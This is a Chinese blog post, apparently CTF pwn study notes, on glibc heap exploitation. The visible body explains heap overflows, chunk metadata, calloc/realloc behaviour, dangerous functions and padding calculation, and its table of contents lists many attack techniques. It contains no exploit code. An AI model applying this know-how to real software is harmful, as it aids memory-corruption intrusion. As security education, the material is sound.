<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>PWN入门到入狱-Heap | Ma9icCR</title><meta name="description" content="PWN入门到入狱-Heap堆的漏洞利用核心就是劫持堆分配的位置，使程序把堆分配到我们指定的地址然后填入数据，造成代码与数据的混淆。 堆溢出堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数（之所以是可使用而不是用户申请的字节数，是因为堆管理器会对用户所申请的字节数进行调整，这也导致可利用的字节数都不小于用户申请的字节数），因而导致了数据溢出，并覆盖到物理相邻的高地址的下一个堆块。"><meta name="keywords" content="pwn"><meta name="author" content="Ma9icCR"><meta name="copyright" content="Ma9icCR"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://ma9iccr.github.io/2022-03/PWN%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-Heap/"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta property="og:type" content="article"><meta property="og:title" content="PWN入门到入狱-Heap"><meta property="og:url" content="https://ma9iccr.github.io/2022-03/PWN%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-Heap/"><meta property="og:site_name" content="Ma9icCR"><meta property="og:description" content="PWN入门到入狱-Heap堆的漏洞利用核心就是劫持堆分配的位置，使程序把堆分配到我们指定的地址然后填入数据，造成代码与数据的混淆。 堆溢出堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数（之所以是可使用而不是用户申请的字节数，是因为堆管理器会对用户所申请的字节数进行调整，这也导致可利用的字节数都不小于用户申请的字节数），因而导致了数据溢出，并覆盖到物理相邻的高地址的下一个堆块。"><meta property="og:image" content="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/pwn.png"><meta property="article:published_time" content="2022-03-28T02:52:56.000Z"><meta property="article:modified_time" content="2022-07-20T01:04:22.416Z"><meta name="twitter:card" content="summary"><script>var activateDarkMode = function () {
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null) {
    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#000')
  }
}
var activateLightMode = function () {
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null) {
    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#fff')
  }
}

var getCookies = function (name) {
  const value = `; ${document.cookie}`
  const parts = value.split(`; ${name}=`)
  if (parts.length === 2) return parts.pop().split(';').shift()
}

var autoChangeMode = 'false'
var t = getCookies('theme')
if (autoChangeMode === '1') {
  var isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
  var isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
  var isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

  if (t === undefined) {
    if (isLightMode) activateLightMode()
    else if (isDarkMode) activateDarkMode()
    else if (isNotSpecified || hasNoSupport) {
      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
      var now = new Date()
      var hour = now.getHours()
      var isNight = hour <= 6 || hour >= 18
      isNight ? activateDarkMode() : activateLightMode()
    }
    window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
      if (Cookies.get('theme') === undefined) {
        e.matches ? activateDarkMode() : activateLightMode()
      }
    })
  } else if (t === 'light') activateLightMode()
  else activateDarkMode()
} else if (autoChangeMode === '2') {
  now = new Date()
  hour = now.getHours()
  isNight = hour <= 6 || hour >= 18
  if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode()
} else {
  if (t === 'dark') activateDarkMode()
  else if (t === 'light') activateLightMode()
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="prev" title="PWN入门到入狱-Integer" href="https://ma9iccr.github.io/2022-03/PWN%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-Integer/"><link rel="next" title="PWN入门到入狱-Format" href="https://ma9iccr.github.io/2022-03/PWN%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-Format/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  bookmark: {
    message_prev: '按',
    message_next: '键将本页加入书签'
  },
  runtime_unit: '天',
  runtime: true,
  copyright: undefined,
  ClickShowText: undefined,
  medium_zoom: false,
  fancybox: true,
  Snackbar: undefined,
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  baiduPush: false,
  highlightCopy: true,
  highlightLang: true,
  isPhotoFigcaption: false,
  islazyload: true,
  isanchor: false    
}</script><script>var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isSidebar: true,
  postUpdate: '2022-07-20 09:04:22'
}</script><noscript><style>
#nav {
  opacity: 1
}
.justified-gallery img{
  opacity: 1
}
</style></noscript><meta name="generator" content="Hexo 4.2.1"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">36</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">14</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">11</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down menus-expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li><li><a class="site-page" href="/images/"><i class="fa-fw fas fa-image"></i><span> Image</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/navigate/"><i class="fa-fw fas fa-navigate"></i><span> Navigate</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN入门到入狱-Heap"><span class="toc-number">1.</span> <span class="toc-text">PWN入门到入狱-Heap</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#堆溢出"><span class="toc-number">1.1.</span> <span class="toc-text">堆溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#寻找堆分配函数"><span class="toc-number">1.1.1.</span> <span class="toc-text">寻找堆分配函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#寻找危险函数"><span class="toc-number">1.1.2.</span> <span class="toc-text">寻找危险函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#确定填充长度"><span class="toc-number">1.1.3.</span> <span class="toc-text">确定填充长度</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#堆中的-Off-By系列"><span class="toc-number">1.2.</span> <span class="toc-text">堆中的 Off-By系列</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#off-by-one-漏洞原理"><span class="toc-number">1.2.1.</span> <span class="toc-text">off-by-one 漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#off-by-one-利用思路"><span class="toc-number">1.2.2.</span> <span class="toc-text">off-by-one 利用思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#off-by-one的示例"><span class="toc-number">1.2.3.</span> <span class="toc-text">off-by-one的示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#在-libc-2-29-之后"><span class="toc-number">1.2.4.</span> <span class="toc-text">在 libc-2.29 之后</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Chunk-Extend-and-Overlapping"><span class="toc-number">1.3.</span> <span class="toc-text">Chunk Extend and Overlapping</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理"><span class="toc-number">1.3.1.</span> <span class="toc-text">原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unlink"><span class="toc-number">1.4.</span> <span class="toc-text">Unlink</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Unlink原理"><span class="toc-number">1.4.1.</span> <span class="toc-text">Unlink原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unlink的绕过-amp-利用"><span class="toc-number">1.4.2.</span> <span class="toc-text">unlink的绕过&amp;利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Use-After-Free"><span class="toc-number">1.5.</span> <span class="toc-text">Use After Free</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#UAF原理"><span class="toc-number">1.5.1.</span> <span class="toc-text">UAF原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fastbin-attack"><span class="toc-number">1.6.</span> <span class="toc-text">Fastbin attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞成因"><span class="toc-number">1.6.1.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#攻击方法分类"><span class="toc-number">1.6.2.</span> <span class="toc-text">攻击方法分类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fastbin-Double-Free"><span class="toc-number">1.6.3.</span> <span class="toc-text">Fastbin Double Free</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#House-of-Spirit"><span class="toc-number">1.6.4.</span> <span class="toc-text">House of Spirit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Alloc-to-Stack"><span class="toc-number">1.6.5.</span> <span class="toc-text">Alloc to Stack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Arbitrary-Alloc"><span class="toc-number">1.6.6.</span> <span class="toc-text">Arbitrary Alloc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unsorted-Bin-Attack"><span class="toc-number">1.7.</span> <span class="toc-text">Unsorted Bin Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#基本来源"><span class="toc-number">1.7.1.</span> <span class="toc-text">基本来源</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基本使用情况"><span class="toc-number">1.7.2.</span> <span class="toc-text">基本使用情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Unsorted-Bin-Leak"><span class="toc-number">1.7.3.</span> <span class="toc-text">Unsorted Bin Leak</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Unsorted-Bin-的结构"><span class="toc-number">1.7.3.1.</span> <span class="toc-text">Unsorted Bin 的结构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Leak-原理"><span class="toc-number">1.7.3.2.</span> <span class="toc-text">Leak 原理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#通过-malloc-trim-函数得出"><span class="toc-number">1.7.3.2.1.</span> <span class="toc-text">通过 __malloc_trim 函数得出</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#通过-malloc-hook-直接算出"><span class="toc-number">1.7.3.2.2.</span> <span class="toc-text">通过 __malloc_hook 直接算出</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#实现-Leak-的方法"><span class="toc-number">1.7.3.3.</span> <span class="toc-text">实现 Leak 的方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Unsorted-Bin-Attack-原理"><span class="toc-number">1.7.4.</span> <span class="toc-text">Unsorted Bin Attack 原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Large-Bin-Attack"><span class="toc-number">1.8.</span> <span class="toc-text">Large Bin Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#总结-large-bin-attack-的利用方法"><span class="toc-number">1.8.1.</span> <span class="toc-text">总结 large bin attack 的利用方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tcache-attack"><span class="toc-number">1.9.</span> <span class="toc-text">Tcache attack</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#tcache-entry"><span class="toc-number">1.9.0.1.</span> <span class="toc-text">tcache_entry</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tcache-perthread-struct"><span class="toc-number">1.9.0.2.</span> <span class="toc-text">tcache_perthread_struct</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基本工作方式"><span class="toc-number">1.9.1.</span> <span class="toc-text">基本工作方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tcache-Usage"><span class="toc-number">1.9.2.</span> <span class="toc-text">Tcache Usage</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwn-Tcache"><span class="toc-number">1.9.3.</span> <span class="toc-text">Pwn Tcache</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#tcache-poisoning"><span class="toc-number">1.9.3.1.</span> <span class="toc-text">tcache poisoning</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tcache-dup"><span class="toc-number">1.9.3.2.</span> <span class="toc-text">tcache dup</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tcache-perthread-corruption"><span class="toc-number">1.9.3.3.</span> <span class="toc-text">tcache perthread corruption</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tcache-house-of-spirit"><span class="toc-number">1.9.3.4.</span> <span class="toc-text">tcache house of spirit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#smallbin-unlink"><span class="toc-number">1.9.3.5.</span> <span class="toc-text">smallbin unlink</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tcache-stashing-unlink-attack"><span class="toc-number">1.9.3.6.</span> <span class="toc-text">tcache stashing unlink attack</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#libc-leak"><span class="toc-number">1.9.3.7.</span> <span class="toc-text">libc leak</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#House-Of-Einherjar"><span class="toc-number">1.10.</span> <span class="toc-text">House Of Einherjar</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理-1"><span class="toc-number">1.10.1.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#后向合并操作"><span class="toc-number">1.10.1.1.</span> <span class="toc-text">后向合并操作</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用原理"><span class="toc-number">1.10.2.</span> <span class="toc-text">利用原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用过程"><span class="toc-number">1.10.3.</span> <span class="toc-text">利用过程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#溢出前"><span class="toc-number">1.10.3.1.</span> <span class="toc-text">溢出前</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#溢出"><span class="toc-number">1.10.3.2.</span> <span class="toc-text">溢出</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#溢出后"><span class="toc-number">1.10.3.3.</span> <span class="toc-text">溢出后</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#总结"><span class="toc-number">1.10.4.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#House-Of-Force"><span class="toc-number">1.11.</span> <span class="toc-text">House Of Force</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理-2"><span class="toc-number">1.11.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#总结-1"><span class="toc-number">1.11.2.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#House-of-Lore"><span class="toc-number">1.12.</span> <span class="toc-text">House of Lore</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#概述"><span class="toc-number">1.12.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基本原理"><span class="toc-number">1.12.2.</span> <span class="toc-text">基本原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#House-of-Orange"><span class="toc-number">1.13.</span> <span class="toc-text">House of Orange</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#House-of-Rabbit"><span class="toc-number">1.14.</span> <span class="toc-text">House of Rabbit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#House-of-Roman"><span class="toc-number">1.15.</span> <span class="toc-text">House of Roman</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#House-of-Pig"><span class="toc-number">1.16.</span> <span class="toc-text">House of Pig</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IO-FILE-Exploitation"><span class="toc-number">1.17.</span> <span class="toc-text">IO_FILE Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FILE-结构"><span class="toc-number">1.17.1.</span> <span class="toc-text">FILE 结构</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#fread"><span class="toc-number">1.17.1.1.</span> <span class="toc-text">fread</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fwrite"><span class="toc-number">1.17.1.2.</span> <span class="toc-text">fwrite</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fopen"><span class="toc-number">1.17.1.3.</span> <span class="toc-text">fopen</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fclose"><span class="toc-number">1.17.1.4.</span> <span class="toc-text">fclose</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#printf-puts"><span class="toc-number">1.17.1.5.</span> <span class="toc-text">printf&#x2F;puts</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#伪造-vtable-劫持程序流程"><span class="toc-number">1.17.2.</span> <span class="toc-text">伪造 vtable 劫持程序流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FSOP"><span class="toc-number">1.17.3.</span> <span class="toc-text">FSOP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#glibc-2-24-下-IO-FILE-的利用"><span class="toc-number">1.17.4.</span> <span class="toc-text">glibc 2.24 下 IO_FILE 的利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#新的利用技术"><span class="toc-number">1.17.5.</span> <span class="toc-text">新的利用技术</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#fileno-与缓冲区的相关利用"><span class="toc-number">1.17.5.1.</span> <span class="toc-text">fileno 与缓冲区的相关利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IO-str-jumps-gt-overflow"><span class="toc-number">1.17.5.2.</span> <span class="toc-text">_IO_str_jumps -&gt; overflow</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IO-str-jumps-gt-finish"><span class="toc-number">1.17.5.3.</span> <span class="toc-text">_IO_str_jumps -&gt; finish</span></a></li></ol></li></ol></li></ol></li></ol></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/pwn.png)"><nav id="nav"><span class="pull-left" id="blog_name"><a class="blog_title" id="site-name" href="/">Ma9icCR</a></span><span class="pull-right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down menus-expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li><li><a class="site-page" href="/images/"><i class="fa-fw fas fa-image"></i><span> Image</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/navigate/"><i class="fa-fw fas fa-navigate"></i><span> Navigate</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><span class="toggle-menu close"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">PWN入门到入狱-Heap</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="发表于 2022-03-28 10:52:56"><i class="far fa-calendar-alt fa-fw"></i> 发表于 2022-03-28</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="更新于 2022-07-20 09:04:22"><i class="fas fa-history fa-fw"></i> 更新于 2022-07-20</span></time><span class="post-meta__categories"><span class="post-meta__separator">|</span><i class="fas fa-inbox fa-fw post-meta__icon"></i><a class="post-meta__categories" href="/categories/pwn/">pwn</a></span></div><div class="meta-secondline"> </div><div class="meta-thirdline"><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta__icon"></i><span>阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="PWN入门到入狱-Heap"><a href="#PWN入门到入狱-Heap" class="headerlink" title="PWN入门到入狱-Heap"></a>PWN入门到入狱-Heap</h1><p>堆的漏洞利用核心就是劫持堆分配的位置，使程序把堆分配到我们指定的地址然后填入数据，造成代码与数据的混淆。</p>
<h2 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h2><p>堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数（<strong>之所以是可使用而不是用户申请的字节数，是因为堆管理器会对用户所申请的字节数进行调整，这也导致可利用的字节数都不小于用户申请的字节数</strong>），因而导致了数据溢出，并覆盖到<strong>物理相邻的高地址</strong>的下一个堆块。</p>
<p>堆溢出漏洞发生的基本前提是</p>
<ul>
<li>程序向堆上写入数据。</li>
<li>写入的数据大小没有被良好地控制。</li>
</ul>
<p>一般来说，我们利用堆溢出的策略是</p>
<p>1.覆盖与其物理相邻的下一个 chunk的内容。</p>
<ul>
<li>prev_size</li>
<li>size，主要有三个比特位，以及该堆块真正的大小。<ul>
<li>NON_MAIN_ARENA</li>
<li>IS_MAPPED</li>
<li>PREV_INUSE</li>
<li>the True chunk size</li>
</ul>
</li>
<li>chunk content，从而改变程序固有的执行流。</li>
</ul>
<p>2.利用堆中的机制（如 unlink 等 ）来实现任意地址写入（ Write-Anything-Anywhere）或控制堆块中的内容等效果，从而来控制程序的执行流。</p>
<p>堆溢出中比较重要的几个步骤:</p>
<h3 id="寻找堆分配函数"><a href="#寻找堆分配函数" class="headerlink" title="寻找堆分配函数"></a>寻找堆分配函数</h3><p>通常来说堆是通过调用 glibc 函数 malloc 进行分配的，在某些情况下会使用 calloc 分配。calloc 与 malloc 的区别是 <strong>calloc 在分配后会自动进行清空，这对于某些信息泄露漏洞的利用来说是致命的</strong>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">calloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="comment">//等同于</span></span><br><span class="line">ptr=<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">memset</span>(ptr,<span class="number">0</span>,<span class="number">0x20</span>);</span><br></pre></td></tr></table></figure>

<p>除此之外，还有一种分配是经由 realloc 进行的，realloc 函数可以身兼 malloc 和 free 两个函数的功能。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *chunk,*chunk1;</span><br><span class="line">  chunk=<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">  chunk1=<span class="built_in">realloc</span>(chunk,<span class="number">32</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>realloc 的操作并不是像字面意义上那么简单，其内部会根据不同的情况进行不同操作</p>
<ul>
<li>当 realloc(ptr,size) 的 size 不等于 ptr 的 size 时<ul>
<li>如果申请 size &gt; 原来 size<ul>
<li>如果 chunk 与 top chunk 相邻，直接扩展这个 chunk 到新 size 大小</li>
<li>如果 chunk 与 top chunk 不相邻，相当于 free(ptr),malloc(new_size)</li>
</ul>
</li>
<li>如果申请 size &lt; 原来 size<ul>
<li>如果相差不足以容得下一个最小 chunk(64 位下 32 个字节，32 位下 16 个字节)，则保持不变</li>
<li>如果相差可以容得下一个最小 chunk，则切割原 chunk 为两部分，free 掉后一部分</li>
</ul>
</li>
</ul>
</li>
<li>当 realloc(ptr,size) 的 size 等于 0 时，相当于 free(ptr)</li>
<li>当 realloc(ptr,size) 的 size 等于 ptr 的 size，不进行任何操作</li>
</ul>
<h3 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h3><p>通过寻找危险函数，我们快速确定程序是否可能有堆溢出，以及有的话，堆溢出的位置在哪里。</p>
<p>常见的危险函数如下</p>
<ul>
<li>输入<ul>
<li>gets，直接读取一行，忽略 <code>&#39;\x00&#39;</code></li>
<li>scanf</li>
<li>vscanf</li>
</ul>
</li>
<li>输出<ul>
<li>sprintf</li>
</ul>
</li>
<li>字符串<ul>
<li>strcpy，字符串复制，遇到 <code>&#39;\x00&#39;</code> 停止</li>
<li>strcat，字符串拼接，遇到 <code>&#39;\x00&#39;</code> 停止</li>
<li>bcopy</li>
</ul>
</li>
</ul>
<h3 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h3><p>这一部分主要是计算<strong>我们开始写入的地址与我们所要覆盖的地址之间的距离</strong>。 一个常见的误区是 malloc 的参数等于实际分配堆块的大小，但是事实上 ptmalloc 分配出来的大小是对齐的。这个长度一般是字长的 2 倍，比如 32 位系统是 8 个字节，64 位系统是 16 个字节。但是对于不大于 2 倍字长的请求，malloc 会直接返回 2 倍字长的块也就是最小 chunk，比如 64 位系统执行<code>malloc(0)</code>会返回用户区域为 16 字节的块。</p>
